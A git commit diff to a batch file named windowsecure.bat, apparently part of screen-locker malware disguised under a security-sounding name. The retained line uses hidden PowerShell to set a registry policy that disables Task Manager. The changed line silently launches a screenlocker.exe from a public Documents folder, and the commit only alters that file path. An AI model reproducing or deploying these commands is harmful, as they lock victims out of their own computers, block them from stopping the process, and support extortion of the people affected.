3b59a945ac54083edec43c7c8b7e4746b35a6de9
NHTBOT <140639828+NHTBOT@users.noreply.github.com>
2023-10-09 17:18:13 +0700

    Update windowsecure.bat

--- windowsecure.bat
+++ windowsecure.bat
@@ -1,2 +1,2 @@
 powershell -windowstyle hidden REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f
-powershell -windowstyle Hidden Start-Process -FilePath "C:\Users\Public\Documents\screenlocker.exe"
+powershell -windowstyle Hidden Start-Process -FilePath "C:\Users\Public\Document\screenlocker.exe"
